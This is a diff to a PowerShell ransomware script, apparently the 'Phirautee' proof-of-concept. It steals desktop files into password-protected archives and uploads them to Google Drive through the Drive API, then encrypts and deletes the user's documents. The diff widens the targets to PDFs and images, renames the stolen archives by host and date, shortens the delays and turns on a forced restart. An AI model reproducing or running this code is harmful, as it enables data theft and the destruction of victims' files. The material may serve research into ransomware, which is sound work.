@@ -46,13 +46,13 @@ Start-Sleep -s 1
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Scope CurrentUser
 Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
-Start-Sleep -s 10
+Start-Sleep -s 3
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
 Write-Host "[+] Zipping files!" -ForegroundColor Green
-Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\backup.zip -Format Zip -Password "$IV11"
+Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\backup-$env:computername.zip -Format Zip -Password "$IV11"
 Remove-Item c:\temp\sys.txt
 Write-Host "[+] File zipped!" -ForegroundColor Green
-
+<#
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Send certificate password via encrypted zip file to Pokemail e-mail
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -78,7 +78,7 @@ Start-Sleep -s 2
 Write-Host "[-] Deleting files" -ForegroundColor Red
 #Remove-Item c:\temp\sys.txt
 #Remove-Item c:\temp\backup.zip
-
+#>
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Password generator for the zip encrypted stolen files
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -87,10 +87,10 @@ $pwd1 = [system.web.security.membership]::GeneratePassword(30,15)
 echo ("$pwd1") > c:/temp/sys1.txt
 $IV1 = "D^Z@e8507=>YS#)qj;zgBeZWb!0-Tp(hBEAi:2.S5G/"
 Write-Host "[+] Zipping files!" -ForegroundColor Green
-Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1.zip -Format Zip -Password "$IV1"
+Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1-$env:computername.zip -Format Zip -Password "$IV1"
 Remove-Item c:\temp\sys1.txt
 Write-Host "[+] File zipped!" -ForegroundColor Green
-
+<#
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Send password for files to your e-mail
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -112,11 +112,11 @@ $Msg.Dispose()
 $Mailer.Dispose()
 
 Write-Host "[+] Email Sent!" -ForegroundColor Green
-Start-Sleep -s 2
+Start-Sleep -s 1
 Write-Host "[-] Deleting files" -ForegroundColor Red
 #Remove-Item c:\temp\sys1.txt
 #Remove-Item c:\temp\backup1.zip
-
+#>
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Files to steal?
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -140,13 +140,13 @@ For($i = 1; $i -le $files.count; $i++)
 
 $files | Select name
 Write-Host "[+] Files copied" -ForegroundColor Green
-Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1"
+Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal-$env:computername-Content$(get-date -f yyyy-MM-dd).zip -Format Zip -Password "$pwd1"
 
-Start-Sleep -s 5
+Start-Sleep -s 2
 Write-Host "[+] Files zipped" -ForegroundColor Green
 #$del = Remove-Item $Destination -Force -Recurse
 Write-Host "[+] Uploading Large Files to G-Drive" -ForegroundColor Green
-Start-Sleep -s 5
+Start-Sleep -s 2
 $del = Remove-Item $Destination -Force -Recurse
 Write-Host "[-] Uploading Large Files Deleted" -ForegroundColor Red
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -168,7 +168,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted = 'c:\temp\steal.zip'
+$FileEncrypted = 'c:\temp\steal-$env:computername-Content$(get-date -f yyyy-MM-dd).zip'
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted
@@ -215,9 +215,9 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\Users\$env:USERNAME\Desktop\Important"
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
-Start-Sleep -s 10
-Remove-Item c:\temp\steal.zip
-Start-Sleep -s 5
+Start-Sleep -s 3
+Remove-Item c:\temp\steal-$env:computername-Content$(get-date -f yyyy-MM-dd).zip
+Start-Sleep -s 2
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -239,7 +239,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted2 = 'c:\temp\backup.zip'
+$FileEncrypted2 = 'c:\temp\backup-$env:computername.zip'
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted2
@@ -286,9 +286,9 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\Users\$env:USERNAME\Desktop\Important"
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
-Start-Sleep -s 10
-Remove-Item c:\temp\backup.zip
-Start-Sleep -s 5
+Start-Sleep -s 3
+Remove-Item c:\temp\backup-$env:computername.zip
+Start-Sleep -s 2
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -310,7 +310,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted3 = 'c:\temp\backup1.zip'
+$FileEncrypted3 = 'c:\temp\backup1-$env:computername.zip'
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted3
@@ -357,9 +357,9 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\Users\$env:USERNAME\Desktop\Important"
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
-Start-Sleep -s 10
-Remove-Item c:\temp\backup1.zip
-Start-Sleep -s 5
+Start-Sleep -s 3
+Remove-Item c:\temp\backup1-$env:computername.zip
+Start-Sleep -s 2
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -396,20 +396,20 @@ Function Encr{param([string]$i,[string]$p)
 
 #foreach ($i in $(Get-ChildItem C:/temp/ -recurse -include *.txt | ForEach-Object { $_.FullName })){
 # Replace C:\tools with the folder you want to encrypt. Also you can add or modify the file types by comma seperated - *.txt, *.jpg, *.png etc.
-foreach ($i in $(Get-ChildItem $env:USERPROFILE\Desktop -recurse -include *.txt, *.doc, *.docx, *.xls, *.xlsx, *.ppt, *.pptx  | ForEach-Object { $_.FullName })){ 
+foreach ($i in $(Get-ChildItem $env:USERPROFILE\Desktop -recurse -include *.txt, *.doc, *.docx, *.xls, *.xlsx, *.ppt, *.pptx, *.pdf, *.png, *.jpg  | ForEach-Object { $_.FullName })){ 
   Encr -i $i -p $pwd
   rm $i
 }
 
 $alert = "https://raw.githubusercontent.com/Viralmaniar/Phirautee/master/defcon.jpg"
 Invoke-WebRequest -Uri $alert -OutFile "C:/temp/defcon.jpg"
-Start-Sleep -s 2
+Start-Sleep -s 1
 
 Write-Host "[+] Phiratee Deployed Successfully..." -ForegroundColor Green
 $encodedcert =  [IO.File]::WriteAllBytes("/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
 #echo (Protect-CmsMessage -Content $pwd -To "/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
 
-Start-Sleep -s 10
+Start-Sleep -s 3
 #remove-variable pwd
 Write-Host "[+] Intiating UI..." -ForegroundColor Green
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
@@ -548,4 +548,4 @@ start-sleep 1
 
 Remove-Item C:\temp\cert.cer
 
-#restart-computer -force
+restart-computer -force
